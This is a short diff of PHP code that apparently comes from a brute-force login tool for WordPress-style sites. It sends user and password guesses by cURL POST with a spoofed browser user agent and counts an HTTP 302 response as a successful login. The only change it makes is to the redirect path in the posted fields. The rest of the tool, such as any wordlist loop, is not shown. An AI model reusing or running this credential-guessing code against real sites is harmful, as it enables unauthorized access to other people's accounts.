@@ -28,7 +28,7 @@
 		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1");
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		curl_setopt($ch, CURLOPT_POST, true);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, "log=$user&pwd=$word&wp-submit=Login&redirect_to=$host/admin/index.php/");
+		curl_setopt($ch, CURLOPT_POSTFIELDS, "log=$user&pwd=$word&wp-submit=Login&redirect_to=$host/admin/login.php/");
 		curl_exec($ch);
 		$ver = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 		if(eregi("302", $ver)){
